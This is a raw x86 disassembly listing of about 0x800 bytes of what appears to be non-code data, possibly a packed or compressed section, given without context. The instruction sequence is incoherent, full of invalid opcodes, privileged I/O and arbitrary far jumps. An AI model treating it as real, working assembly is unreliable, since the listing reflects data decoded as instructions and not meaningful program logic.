  426cba:	xor    ecx,0xc5f12182
  426cc0:	cmp    BYTE PTR [ecx],bh
  426cc2:	sbb    BYTE PTR [eax+0x18b92b87],bh
  426cc8:	nop
  426cc9:	lds    ecx,FWORD PTR [ebx]
  426ccb:	mov    dh,BYTE PTR [bx+di]
  426cce:	mov    esi,0xe096d30e
  426cd3:	call   0x5173:0x403249fa
  426cda:	dec    dl
  426cdc:	in     eax,0x8c
  426cde:	addr16 mov bl,ah
  426ce1:	add    dl,dh
  426ce3:	rcr    DWORD PTR [edi],1
  426ce5:	(bad)  
  426ce6:	pop    esi
  426ce7:	mov    cl,0xf4
  426ce9:	iret   
  426cea:	push   ecx
  426ceb:	push   es
  426cec:	bound  esi,QWORD PTR [edx+0x28982763]
  426cf2:	daa    
  426cf3:	pop    es
  426cf4:	aad    0xc7
  426cf6:	mov    ah,0xd3
  426cf8:	pushf  
  426cf9:	pushf  
  426cfa:	ret    0x5f7a
  426cfd:	xor    ah,dh
  426cff:	popf   
  426d00:	jecxz  0x426cb8
  426d02:	push   esp
  426d03:	pop    ecx
  426d04:	pop    ss
  426d05:	jge    0x426d67
  426d07:	sar    DWORD PTR ds:0xbb8df3ca,cl
  426d0d:	psubusb mm2,QWORD PTR [esp+eiz*2]
  426d11:	cmp    al,0x1e
  426d13:	add    BYTE PTR [eax],bh
  426d15:	inc    ebx
  426d16:	pusha  
  426d17:	pop    ds
  426d18:	not    DWORD PTR [ecx+0x40]
  426d1b:	mov    bh,ah
  426d1d:	xor    al,0x94
  426d1f:	sub    eax,0xef749a85
  426d24:	mov    BYTE PTR ds:0xd3317ff7,ah
  426d2a:	addr16 mov ds:0x8179,al
  426d2f:	push   edi
  426d30:	enter  0xe9b9,0x79
  426d34:	inc    ebx
  426d35:	xchg   esp,eax
  426d36:	into   
  426d37:	cli    
  426d38:	and    BYTE PTR [esi-0x299e59c8],ch
  426d3e:	dec    esi
  426d3f:	pop    ecx
  426d40:	xchg   esi,eax
  426d41:	pop    esi
  426d42:	mov    ds,ebx
  426d44:	frndint 
  426d46:	dec    ebp
  426d47:	dec    edi
  426d48:	into   
  426d49:	test   bh,al
  426d4b:	pop    ecx
  426d4c:	in     eax,0x80
  426d4e:	(bad)  
  426d4f:	addr16 pop ds
  426d51:	in     eax,dx
  426d52:	idiv   ebp
  426d54:	jle    0x426cfc
  426d56:	inc    edx
  426d57:	push   ebx
  426d58:	lods   eax,DWORD PTR ds:[esi]
  426d59:	or     DWORD PTR [edi+0x4b],ecx
  426d5c:	inc    eax
  426d5d:	jo     0x426dbe
  426d5f:	in     eax,0x40
  426d61:	maskmovq mm3,(bad)
  426d62:	neg    DWORD PTR [esi+0x25051f67]
  426d68:	in     al,0x49
  426d6a:	mov    edx,0xa610c080
  426d6f:	add    al,0x1
  426d71:	xchg   DWORD PTR [edi+0x66],edx
  426d74:	and    BYTE PTR [esi+0x26c41752],ah
  426d7a:	rcl    DWORD PTR [eax+0x36],1
  426d7d:	mov    WORD PTR [eax*8+0x77dcc445],ds
  426d84:	rcr    BYTE PTR [eax],0xb
  426d87:	test   BYTE PTR ds:0x6afd5c45,dl
  426d8d:	mov    edx,DWORD PTR [ebp+0x4f5b35db]
  426d93:	(bad)  
  426d94:	pusha  
  426d95:	ror    ebp,0x30
  426d98:	and    ecx,ebx
  426d9a:	dec    ebp
  426d9b:	cmp    esp,DWORD PTR [eax-0x1d]
  426d9e:	lea    ebp,[esi+0x41]
  426da1:	mov    eax,ds:0x1cca618
  426da6:	inc    esp
  426da7:	add    ah,bl
  426da9:	mov    eax,0xa74b3847
  426dae:	ds pop ss
  426db0:	repnz inc edi
  426db2:	jmp    0x426dce
  426db4:	scas   eax,DWORD PTR es:[edi]
  426db5:	call   0xe1dc:0x7f4d933f
  426dbc:	dec    ecx
  426dbd:	jmp    0x426dc9
  426dbf:	out    0xaa,eax
  426dc1:	or     edx,DWORD PTR [edi+0x141c7e80]
  426dc7:	mov    bl,0x96
  426dc9:	mov    ah,0x21
  426dcb:	push   ebp
  426dcc:	aas    
  426dcd:	mov    dl,BYTE PTR [edx+ebx*1+0x5b75ce4e]
  426dd4:	push   cs
  426dd5:	push   esp
  426dd6:	fdivr  QWORD PTR [ecx]
  426dd8:	add    dh,dl
  426dda:	popa   
  426ddb:	pop    edi
  426ddc:	inc    esi
  426ddd:	sar    DWORD PTR [eax-0x79],1
  426de0:	call   0x516dc5c7
  426de5:	mov    ebx,0x94c71c0e
  426dea:	push   cs
  426deb:	pop    ebx
  426dec:	xor    esp,DWORD PTR [ebx+ebx*2+0x6e84df64]
  426df3:	icebp  
  426df4:	dec    esi
  426df5:	mov    eax,ds:0x28610895
  426dfa:	leave  
  426dfb:	adc    DWORD PTR [ebx+0x8ff63ef],ecx
  426e01:	cmp    dl,dl
  426e03:	mov    ds:0x113c9609,eax
  426e08:	repnz xchg edi,eax
  426e0a:	mov    esp,0xc05632d2
	...
  426e17:	add    BYTE PTR [eax],al
  426e19:	add    BYTE PTR [esi-0x28ab281c],dh
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	pop    cx
  426e28:	arpl   WORD PTR [edx],ax
  426e2a:	jne    0x426e10
  426e2c:	add    DWORD PTR [eax],eax
  426e2e:	std    
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [eax],dh
  426e33:	push   edi
  426e34:	ja     0x426e7d
  426e36:	fist   WORD PTR [esi+0x7841666b]
  426e3c:	sbb    DWORD PTR [ebx+eax*1-0x34a5bde4],edi
  426e43:	arpl   WORD PTR [edx-0x1bdf2db6],cx
  426e49:	je     0x426dd2
  426e4b:	or     al,bl
  426e4d:	(bad)  [ecx+0x6f]
  426e50:	pop    edx
  426e51:	mov    ds:0xb8330765,al
  426e56:	pop    ds
  426e57:	sub    cl,BYTE PTR [esi+0x4d]
  426e5a:	fwait
  426e5b:	rcl    BYTE PTR [ebx+0x12],1
  426e5e:	clc    
  426e5f:	sbb    al,0xa8
  426e61:	loop   0x426e21
  426e63:	mov    bh,0x25
  426e65:	dec    eax
  426e66:	fst    QWORD PTR [edx+esi*8+0x61d248d5]
  426e6d:	jb     0x426e06
  426e6f:	mov    WORD PTR [ecx+0x13a0c34d],es
  426e75:	adc    bh,BYTE PTR [edi+0x34f1d714]
  426e7b:	out    0x26,al
  426e7d:	mov    eax,ds:0x85c8e53b
  426e82:	add    BYTE PTR [eax],0x1e
  426e85:	popf   
  426e86:	mov    dl,0xfd
  426e88:	sub    ebp,0xffffffa1
  426e8b:	mov    al,ds:0xc9c816bb
  426e90:	jmp    0xe9412512
  426e95:	bound  cx,DWORD PTR [ecx+0x38]
  426e99:	mov    ch,0xba
  426e9b:	rcr    DWORD PTR [eax-0x130ed536],0x2e
  426ea2:	repnz imul edx,DWORD PTR [esi-0x77916edf],0xffffffe6
  426eaa:	icebp  
  426eab:	sub    DWORD PTR [eax],ebx
  426ead:	inc    ebp
  426eae:	fs jmp 0x2c82:0xccfecc5e
  426eb6:	cmp    BYTE PTR [esi],cl
  426eb8:	xor    ah,dl
  426eba:	sub    ebp,ebp
  426ebc:	shl    ah,cl
  426ebe:	inc    ebx
  426ebf:	stos   DWORD PTR es:[edi],eax
  426ec0:	pushf  
  426ec1:	mov    ds:0x10682a47,eax
  426ec6:	add    ebp,esi
  426ec8:	xchg   ecx,eax
  426ec9:	sbb    al,BYTE PTR [ecx+eiz*1-0x5ec1b750]
  426ed0:	xor    al,0xcd
  426ed2:	adc    ch,BYTE PTR [eax+0x1b]
  426ed5:	ret    
  426ed6:	mov    ah,0xa1
  426ed8:	repz pop bp
  426edb:	mov    al,0x26
  426edd:	fs outs dx,BYTE PTR ds:[esi]
  426ee0:	aas    
  426ee1:	jb     0x426f2d
  426ee3:	pop    ecx
  426ee4:	sti    
  426ee5:	xor    edx,DWORD PTR [esi+eax*4]
  426ee8:	(bad)  
  426eea:	(bad)  
  426eeb:	jmp    0x426eb1
  426eed:	xchg   DWORD PTR [eax+0x2e],ebx
  426ef0:	xor    eax,0x64060cd3
  426ef5:	dec    esp
  426ef6:	mov    ah,0x29
  426ef8:	xchg   edx,eax
  426ef9:	mov    ebp,0x25443005
  426efe:	push   edi
  426eff:	int    0x10
  426f01:	jmp    0x7fc2:0x48f62c66
  426f08:	jmp    0x599a:0x2b4719db
  426f0f:	test   eax,0xd6f47ce1
  426f14:	add    DWORD PTR [ebx],esi
  426f16:	fist   WORD PTR [edx-0x238e5546]
  426f1c:	pop    ebx
  426f1d:	cmp    ebp,eax
  426f1f:	sub    al,BYTE PTR [esi]
  426f21:	inc    ebx
  426f22:	jl     0x426f2a
  426f24:	xor    al,0xc4
  426f26:	pop    edx
  426f27:	lods   al,BYTE PTR ds:[esi]
  426f28:	stos   BYTE PTR es:[edi],al
  426f29:	test   eax,0x917faa82
  426f2e:	sub    DWORD PTR [eax],0x73f7bdb0
  426f34:	sbb    al,0x39
  426f36:	mov    eax,ds:0xe46b0af5
  426f3b:	cld    
  426f3c:	pusha  
  426f3d:	mov    ebp,0x166c575
  426f42:	mov    ch,al
  426f44:	lahf   
  426f45:	push   es
  426f46:	rcr    BYTE PTR [ebx],1
  426f48:	sahf   
  426f49:	nop
  426f4a:	out    dx,eax
  426f4b:	jnp    0x426f74
  426f4d:	popa   
  426f4e:	inc    edx
  426f4f:	sahf   
  426f50:	arpl   bp,bp
  426f52:	shr    ah,0x81
  426f55:	sahf   
  426f56:	(bad)  
  426f58:	mov    ah,0xbf
  426f5a:	or     dl,BYTE PTR [ecx]
  426f5c:	xlat   BYTE PTR ds:[ebx]
  426f5d:	xor    esp,eax
  426f5f:	lods   eax,DWORD PTR ds:[esi]
  426f60:	das    
  426f61:	jno    0x426f7c
  426f63:	popa   
  426f64:	nop
  426f65:	cld    
  426f66:	out    dx,al
  426f67:	or     dl,dh
  426f69:	pushf  
  426f6a:	scas   eax,DWORD PTR es:[edi]
  426f6b:	sbb    BYTE PTR [edx],cl
  426f6d:	mov    eax,0xdc99ee9b
  426f72:	push   0xe
  426f74:	outs   dx,DWORD PTR ds:[esi]
  426f75:	in     eax,0x52
  426f77:	push   ebx
  426f78:	sub    DWORD PTR [edx+ebp*2],0xd5430901
  426f7f:	pusha  
  426f80:	jnp    0x426fdc
  426f82:	call   0x66c5:0xa4faf4ee
  426f89:	lods   al,BYTE PTR ds:[esi]
  426f8a:	mov    al,0xfc
  426f8c:	scas   eax,DWORD PTR es:[edi]
  426f8d:	mov    al,0x6d
  426f8f:	pusha  
  426f90:	cmp    eax,0x7373b275
  426f95:	(bad)  
  426f96:	sbb    dh,cl
  426f98:	fild   QWORD PTR [edx+ebp*4-0xeeddc68]
  426f9f:	pop    es
  426fa0:	fdivp  st(3),st
  426fa2:	ret    0x1a0a
  426fa5:	xchg   edi,eax
  426fa6:	leave  
  426fa7:	cmp    ebp,DWORD PTR [edx+0x727960e7]
  426fad:	scas   al,BYTE PTR es:[edi]
  426fae:	enter  0x3c3d,0xb6
  426fb2:	mov    es,WORD PTR es:[ebx]
  426fb5:	jno    0x427023
  426fb7:	sub    al,0x3a
  426fb9:	je     0x426f6c
  426fbb:	pop    es
  426fbc:	icebp  
  426fbd:	adc    eax,0x94edd998
  426fc2:	jbe    0x426fe6
  426fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426fc5:	xchg   ebp,eax
  426fc6:	test   al,0xb7
  426fc8:	(bad)  
  426fc9:	out    0x89,al
  426fcb:	mov    ecx,0xe8ab9943
  426fd0:	pop    es
  426fd1:	sbb    eax,0xe6c47fb0
  426fd6:	out    dx,eax
  426fd7:	xchg   esi,eax
  426fd8:	fnstenv [ebp+0x3e]
  426fdb:	push   es
  426fdc:	pop    esp
  426fdd:	jo     0x427029
  426fdf:	cwde   
  426fe0:	loop   0x42703a
  426fe2:	xchg   DWORD PTR [ebx+0x6e],ecx
  426fe5:	xchg   edx,eax
  426fe6:	adc    eax,0x4c2f1435
  426feb:	in     al,0xdf
  426fed:	test   DWORD PTR [ebx],edx
  426fef:	ins    DWORD PTR es:[edi],dx
  426ff0:	out    dx,al
  426ff1:	mov    ecx,0xcf37d462
  426ff6:	pusha  
  426ff7:	mov    bl,BYTE PTR [edi-0x25513107]
  426ffd:	loope  0x426f99
  426fff:	std    
  427000:	ficomp DWORD PTR [edi-0x5a]
  427003:	pop    edi
  427004:	sbb    DWORD PTR [ecx-0x71ee9464],ecx
  42700a:	add    DWORD PTR [eax],edx
  42700c:	jbe    0x426f9f
  42700e:	inc    esp
  42700f:	pop    ss
  427010:	lods   eax,DWORD PTR ds:[esi]
  427011:	nop
  427012:	clc    
  427013:	push   es
  427014:	mov    cl,0x52
  427016:	loopne 0x426f98
  427018:	fidivr WORD PTR [ebx-0x7842ee3b]
  42701e:	mov    eax,ds:0x2be28168
  427023:	add    esp,DWORD PTR [eax+0x3468d272]
  427029:	ins    DWORD PTR es:[edi],dx
  42702a:	out    0x9f,eax
  42702c:	xchg   edi,eax
  42702d:	pop    ebx
  42702e:	xchg   edx,eax
	...
  427037:	add    BYTE PTR [eax],al
  427039:	add    dl,bh
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx-0x765bc2eb]
  427047:	jnp    0x426ff3
  427049:	add    al,0x72
  42704b:	out    0x1,al
  42704d:	add    ch,bh
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    BYTE PTR [esi],ch
  427053:	call   eax
  427055:	xchg   ebp,eax
  427056:	jo     0x5b9cf3ae
  42705c:	xchg   ebx,eax
  42705d:	dec    edi
  42705e:	loopne 0x42709f
  427060:	loope  0x427013
  427062:	jle    0x427029
  427064:	loope  0x4270c6
  427066:	xchg   edx,eax
  427067:	mov    ebp,0xedb10ee3
  42706c:	dec    ebp
  42706d:	jbe    0x4270af
  42706f:	ds push esp
  427071:	add    dh,0x2
  427074:	cmp    edx,DWORD PTR gs:[esi+edx*4]
  427078:	int    0x3c
  42707a:	retf   0xa7a5
  42707d:	cld    
  42707e:	mov    ah,0x3b
  427080:	hlt    
  427081:	adc    DWORD PTR [edi],eax
  427083:	add    DWORD PTR [ebp+ebx*8-0x29176980],0xffffffda
  42708b:	mov    ebx,0x5fef5aa2
  427090:	sub    al,0x36
  427092:	pop    es
  427093:	dec    eax
  427094:	xchg   edx,eax
  427095:	test   al,0xe1
  427097:	js     0x4270e8
  427099:	and    edx,DWORD PTR [ebp+0x33]
  42709c:	loopne 0x4270b1
  42709e:	adc    bl,BYTE PTR [eax]
  4270a0:	mov    BYTE PTR [esi+0x51872eab],bh
  4270a6:	adc    eax,0x5692f68e
  4270ab:	mov    edx,ebx
  4270ad:	inc    ebp
  4270ae:	call   0x2004d260
  4270b3:	mov    ds:0x9c1de504,eax
  4270b8:	cmp    ebx,DWORD PTR [ebx+0x4c]
  4270bb:	popa   
  4270bc:	in     al,dx
  4270bd:	sub    al,0x35
  4270bf:	pop    esi
  4270c0:	mov    ds,ecx
  4270c2:	repnz jmp 0xd4f0:0x8a6d9ec
  4270ca:	xor    edx,eax
  4270cc:	repnz out 0x98,eax
  4270cf:	stos   BYTE PTR es:[edi],al
  4270d0:	pop    edi
  4270d1:	cmp    BYTE PTR [eax+ebx*2+0x683177d2],bh
  4270d8:	sub    dl,BYTE PTR [edx+0x1e8f9704]
  4270de:	retf   
  4270df:	sbb    cl,BYTE PTR [ebp-0xe]
  4270e2:	mov    DWORD PTR [esi-0x2baeedc],0xb31a6cc2
  4270ec:	ins    BYTE PTR es:[edi],dx
  4270ed:	(bad)
  4270f0:	or     DWORD PTR [esi],0x50
  4270f3:	jmp    0x5c27:0x508d26fa
  4270fa:	inc    eax
  4270fb:	pushf  
  4270fc:	not    DWORD PTR [ebp+0x27b70ceb]
  427102:	fwait
  427103:	push   0xd4a6bd80
  427108:	cmc    
  427109:	xchg   esp,eax
  42710a:	cmp    BYTE PTR [ebx+ebp*1-0x3a08b4f6],dl
  427111:	pop    edx
  427112:	sbb    al,0xe2
  427114:	mov    edx,0xd751a92a
  427119:	fbld   TBYTE PTR [ebx-0x216870af]
  42711f:	sbb    edi,DWORD PTR [ecx]
  427121:	xchg   esp,eax
  427122:	xor    al,0xf5
  427124:	outs   dx,DWORD PTR ds:[esi]
  427125:	pop    eax
  427126:	inc    edi
  427127:	cmp    al,0x2
  427129:	and    al,0x26
  42712b:	push   ss
  42712c:	mov    al,0xe7
  42712e:	jno    0x4270c1
  427130:	xchg   esi,eax
  427131:	js     0x427178
  427133:	in     eax,dx
  427134:	loopne 0x427177
  427136:	add    eax,0x96b93b06
  42713b:	dec    DWORD PTR [edi]
  42713d:	scas   eax,DWORD PTR es:[edi]
  42713e:	sub    al,0x84
  427140:	pusha  
  427141:	mov    ch,0x7a
  427143:	push   0xffffffd8
  427145:	cmp    eax,0x1084e2c0
  42714a:	sub    ebx,edi
  42714c:	jl     0x42718c
  42714e:	jmp    0x191784c
  427153:	aam    0xc7
  427155:	inc    ebp
  427156:	(bad)  
  427157:	repnz pop esi
  427159:	ret    0xb940
  42715c:	sti    
  42715d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42715e:	dec    esp
  42715f:	arpl   WORD PTR [ecx+0x4fcf14e8],cx
  427165:	shl    DWORD PTR [ebx],0xd0
  427168:	ds mov bl,0xee
  42716b:	lods   al,BYTE PTR ds:[esi]
  42716c:	cmp    ch,bh
  42716e:	into   
  42716f:	shl    BYTE PTR [edi+0x1e],cl
  427172:	mov    edx,DWORD PTR [ebp+0x24]
  427175:	pop    esp
  427176:	jae    0x42718a
  427178:	inc    eax
  427179:	push   ss
  42717a:	pop    esi
  42717b:	gs int3 
  42717d:	push   ds
  42717e:	mov    bh,0xdf
  427180:	cwde   
  427181:	shr    DWORD PTR [ecx-0xa668f6b],0xab
  427188:	mov    ch,0x39
  42718a:	xchg   DWORD PTR [edx+ebp*1+0x2d],edi
  42718e:	retf   
  42718f:	popa   
  427190:	mov    bh,0xc4
  427192:	inc    ecx
  427193:	mov    eax,ds:0x366198d5
  427198:	cli    
  427199:	cdq    
  42719a:	dec    esi
  42719b:	ds repz sbb ecx,0xffffffac
  4271a0:	cwde   
  4271a1:	loope  0x4271c9
  4271a3:	and    ebx,DWORD PTR [esi]
  4271a5:	mov    BYTE PTR [edi+0x28],dh
  4271a8:	push   esi
  4271a9:	hlt    
  4271aa:	adc    eax,0x517ffd84
  4271af:	data16 jge 0x427204
  4271b2:	mov    esp,ecx
  4271b4:	pop    ds
  4271b5:	or     DWORD PTR [edi-0x35],edi
  4271b8:	(bad)  
  4271b9:	fcom   QWORD PTR [esp+ecx*1+0x6d1eba66]
  4271c0:	pop    eax
  4271c1:	and    ecx,esi
  4271c3:	xchg   esp,eax
  4271c4:	icebp  
  4271c5:	xor    al,0xbf
  4271c7:	sub    esp,edx
  4271c9:	inc    edi
  4271ca:	(bad)  
  4271cb:	push   ss
  4271cc:	je     0x4271c0
  4271ce:	mov    ebp,0x931f594d
  4271d3:	jb     0x4271cf
  4271d5:	sbb    edi,edx
  4271d7:	mov    bl,0xea
  4271d9:	repz (bad) 
  4271db:	dec    esi
  4271dc:	test   ah,al
  4271de:	jle    0x4271a8
  4271e0:	loope  0x427182
  4271e2:	jmp    0x5ab8:0xd0063144
  4271e9:	ds enter 0xc459,0xc3
  4271ee:	(bad)  
  4271ef:	loope  0x4271cf
  4271f1:	xor    DWORD PTR [esp-0x6a],0x7ac64a61
  4271f9:	push   0x2251772f
  4271fe:	out    0x4d,al
  427200:	push   edi
  427201:	psrlw  mm5,QWORD PTR [eax+0x54766147]
  427208:	or     esi,DWORD PTR [esi]
  42720a:	pop    ebp
  42720b:	ret    0xbf89
  42720e:	arpl   bx,bx
  427210:	cmp    cl,BYTE PTR [ebp+eax*2+0x7b]
  427214:	arpl   dx,si
  427216:	inc    ecx
  427217:	cmp    edx,DWORD PTR [esi]
  427219:	jecxz  0x4271f5
  42721b:	aaa    
  42721c:	adc    BYTE PTR [ecx-0x3de74837],dh
  427222:	loop   0x427206
  427224:	aaa    
  427225:	xchg   BYTE PTR ds:0x3d7e68e3,bh
  42722b:	push   0x49ccac6f
  427230:	bound  edx,QWORD PTR [ebx]
  427232:	cmp    DWORD PTR [esi],0xff460c3b
  427238:	push   es
  427239:	(bad)  [edi]
  42723b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42723c:	sbb    edx,esp
  42723e:	pop    edi
  42723f:	(bad)  
  427240:	cmp    dh,bh
  427242:	ror    DWORD PTR [edx+edi*2+0x6b4b7bc6],cl
  427249:	into   
  42724a:	jp     0x427297
  42724c:	xor    eax,DWORD PTR [ecx]
  42724e:	stos   BYTE PTR es:[edi],al
	...
  427257:	add    BYTE PTR [eax],al
  427259:	add    bh,cl
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0x69b02077
  427267:	xor    BYTE PTR [edx+0x1e86ff6],ah
  42726d:	add    ch,bh
  42726f:	add    DWORD PTR [eax],eax
  427271:	add    BYTE PTR [eiz*1-0x54009872],cl
  427278:	addr16 mov ss,eax
  42727b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42727c:	aas    
  42727d:	add    eax,0xe1e90914
  427282:	pop    ebp
  427283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427284:	outs   dx,DWORD PTR ds:[esi]
  427285:	add    ecx,esp
  427287:	and    ecx,edx
  427289:	or     BYTE PTR [ecx+0x35],al
  42728c:	xor    DWORD PTR [ebx+0x2eabd12b],edi
  427292:	xor    al,0xe4
  427294:	movups xmm6,XMMWORD PTR [ecx-0x18a7738]
  42729b:	add    eax,0x7c43f34e
  4272a0:	mov    bl,0x9f
  4272a2:	mov    ah,0xf3
  4272a4:	call   0x9f7a5898
  4272a9:	jl     0x427312
  4272ab:	inc    ecx
  4272ac:	cs pop ss
  4272ae:	pop    eax
  4272af:	xchg   ebx,eax
  4272b0:	popa   
  4272b1:	pop    ebp
  4272b2:	stos   BYTE PTR es:[edi],al
  4272b3:	fmul   QWORD PTR [ebp-0x30]
  4272b6:	int3   
  4272b7:	ret    
  4272b8:	xlat   BYTE PTR ds:[ebx]
  4272b9:	and    al,0x17
  4272bb:	mov    ds:0x6847089a,al
  4272c0:	inc    ebp
  4272c1:	mov    ch,BYTE PTR [edi-0x1f]
  4272c4:	pop    edi
  4272c5:	test   DWORD PTR [edi+0x50],edx
  4272c8:	hlt    
  4272c9:	cmp    eax,0xbe9880b0
  4272ce:	js     0x4272eb
  4272d0:	pusha  
  4272d1:	lahf   
  4272d2:	int    0xcc
  4272d4:	outs   dx,BYTE PTR ds:[esi]
  4272d5:	pusha  
  4272d6:	inc    ebx
  4272d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272d8:	xchg   edi,eax
  4272d9:	adc    edi,esi
  4272db:	outs   dx,BYTE PTR ds:[esi]
  4272dc:	jecxz  0x42729f
  4272de:	ret    
  4272df:	sbb    ch,BYTE PTR [edi]
  4272e1:	icebp  
  4272e2:	mov    edi,0xdec59cd0
  4272e7:	jns    0x42729e
  4272e9:	arpl   si,cx
  4272eb:	call   0xfd9c:0x69e48f1b
  4272f2:	xor    ecx,DWORD PTR [eax-0xe78e533]
  4272f8:	jg     0x42735e
  4272fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272fb:	out    dx,eax
  4272fc:	bound  eax,QWORD PTR [edx]
  4272fe:	(bad)  
  4272ff:	sbb    BYTE PTR [edx-0x50],ah
  427302:	ss mov edx,0xdcddb2a1
  427308:	add    ch,dl
  42730a:	dec    ecx
  42730b:	ss (bad) 
  42730d:	mov    ecx,0xdfc6cf0e
  427312:	xlat   BYTE PTR ds:[ebx]
  427313:	mov    al,0x15
  427315:	ins    BYTE PTR es:[edi],dx
  427316:	movq   mm2,QWORD PTR [esi+0x44]
  42731a:	test   BYTE PTR [esi+0x3b],ch
  42731d:	xor    bh,dh
  42731f:	or     BYTE PTR [edi+0x25],0x29
  427323:	call   DWORD PTR [ecx+eax*1]
  427326:	or     DWORD PTR [edi-0x1e],eax
  427329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42732a:	adc    BYTE PTR [ebp-0x575f824e],dl
  427330:	test   eax,0xec026847
  427335:	in     eax,dx
  427336:	inc    ecx
  427337:	(bad)  
  427338:	fs mov edi,0x46a8811d
  42733e:	sbb    al,0xc6
  427340:	mov    dh,0x81
  427342:	add    al,0xd1
  427344:	retf   
  427345:	xchg   edi,eax
  427346:	mov    al,0xd2
  427348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427349:	scas   al,BYTE PTR es:[edi]
  42734a:	imul   eax,DWORD PTR ds:0x25533d85,0x9df0ed9b
  427354:	imul   edi,DWORD PTR [ebx],0x46229fe6
  42735a:	and    bh,BYTE PTR [ecx-0x52]
  42735d:	push   ebx
  42735e:	neg    BYTE PTR [edi+0x1a]
  427361:	addr16 xchg ebx,eax
  427363:	fnstenv [eax+0x19]
  427366:	pop    ebp
  427367:	retf   0xa389
  42736a:	sar    DWORD PTR [edi+ecx*8+0x41019bcb],cl
  427371:	stos   DWORD PTR es:[edi],eax
  427372:	mov    edi,0xd0380b21
  427377:	and    BYTE PTR ds:0xee7cb59b,al
  42737d:	sbb    al,0xe0
  42737f:	jnp    0x42732b
  427381:	inc    esp
  427382:	mov    al,0xa7
  427384:	mov    ecx,0xe2138f72
  427389:	xor    BYTE PTR [esi],dh
  42738b:	inc    ecx
  42738c:	lock mov WORD PTR [eax],?
  42738f:	lea    ebp,[ecx-0x2369c6b]
  427395:	es sbb al,0x4d
  427398:	(bad)  
  427399:	ret    0x29be
  42739c:	mov    bl,0xb1
  42739e:	test   DWORD PTR [ebx-0x79],ecx
  4273a1:	add    bh,dh
  4273a3:	xchg   esi,eax
  4273a4:	fwait
  4273a5:	or     eax,0x6a651d53
  4273aa:	repz imul ebp,DWORD PTR [ebx-0x602f3598],0xffffffb8
  4273b2:	lods   eax,DWORD PTR ds:[esi]
  4273b3:	enter  0x130d,0xd0
  4273b7:	sbb    BYTE PTR [ebp-0x5440d0af],0xdf
  4273be:	add    cl,BYTE PTR [esi]
  4273c0:	pop    eax
  4273c1:	adc    bl,ah
  4273c3:	cld    
  4273c4:	mov    DWORD PTR [edi],ecx
  4273c6:	into   
  4273c7:	iret   
  4273c8:	(bad)  
  4273c9:	(bad)  
  4273ca:	dec    edi
  4273cb:	in     al,dx
  4273cc:	out    0xff,eax
  4273ce:	push   edi
  4273cf:	and    DWORD PTR [ebp-0x1902350b],0xa0343cf0
  4273d9:	and    edx,DWORD PTR [edi]
  4273db:	mov    eax,ds:0x3cad0ae7
  4273e0:	sub    eax,ebx
  4273e2:	mov    al,0x98
  4273e4:	bound  esp,QWORD PTR [ebx-0x7d]
  4273e7:	(bad)  
  4273e8:	jp     0x427391
  4273ea:	data16 scas al,BYTE PTR es:[edi]
  4273ec:	fidiv  DWORD PTR [edi]
  4273ee:	mov    ds:0xa229a21a,al
  4273f3:	push   DWORD PTR ds:0x15a05a1e
  4273f9:	xchg   edx,eax
  4273fa:	sub    esi,DWORD PTR [eax+edx*1]
  4273fd:	xchg   esp,eax
  4273fe:	sbb    dh,BYTE PTR [ebx-0x682c20cc]
  427404:	mov    edi,0x27421d50
  427409:	(bad)  
  42740a:	mov    al,0x14
  42740c:	and    ax,0x4417
  427410:	stos   BYTE PTR es:[edi],al
  427411:	iret   
  427412:	lahf   
  427413:	(bad)  
  427414:	xor    al,0x5f
  427416:	jecxz  0x427470
  427418:	stos   DWORD PTR es:[edi],eax
  427419:	pop    edi
  42741a:	fwait
  42741b:	(bad)
  42741e:	inc    esp
  42741f:	add    DWORD PTR [edx+ebp*1-0x41da83ab],esi
  427426:	xor    eax,0x59ce8ced
  42742b:	sahf   
  42742c:	(bad)  
  42742d:	pop    edx
  42742e:	xchg   ecx,eax
  42742f:	dec    esi
  427430:	jl     0x4273dd
  427432:	fistp  QWORD PTR [ecx+0x5e]
  427435:	jno    0x4273e9
  427437:	mov    edi,0xdadaea38
  42743c:	or     esi,DWORD PTR [edx-0x1]
  42743f:	in     eax,dx
  427440:	sub    esi,edi
  427442:	push   ds
  427443:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  427445:	xchg   esp,eax
  427446:	js     0x4274b1
  427448:	adc    BYTE PTR [edi-0x50048d1b],ah
  42744e:	test   eax,0x773c6fff
  427453:	jae    0x427427
  427455:	sahf   
  427456:	push   edi
  427457:	jne    0x42743c
  427459:	mov    DWORD PTR [ecx-0x31],edi
  42745c:	in     eax,dx
  42745d:	jb     0x42749c
  42745f:	sbb    BYTE PTR [eax-0x2f547d62],al
  427465:	push   ebx
  427466:	push   esp
  427467:	lods   eax,DWORD PTR ds:[esi]
  427468:	jle    0x427401
  42746a:	fld    TBYTE PTR [ebx+0x6e]
  42746d:	popa   
  42746e:	jg     0x427470
	...
  427478:	add    BYTE PTR [eax],al
  42747a:	push   0x6f1e2d23
  42747f:	push   ds
  427480:	jnp    0x4274f9
  427482:	outs   dx,DWORD PTR ds:[esi]
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	jl     0x4274f7
  427488:	jnp    0x4274b9
  42748a:	ins    BYTE PTR es:[edi],dx
  42748b:	jmp    0x0:0x1fd0001
  427492:	xchg   BYTE PTR [ebx+0x8637878],al
  427498:	mov    ?,WORD PTR [ebp+0x5519514a]
  42749e:	int3   
  42749f:	ins    DWORD PTR es:[edi],dx
  4274a0:	mov    ebp,0xc0e19c6a
  4274a5:	inc    esi
  4274a6:	or     bl,ah
  4274a8:	inc    ecx
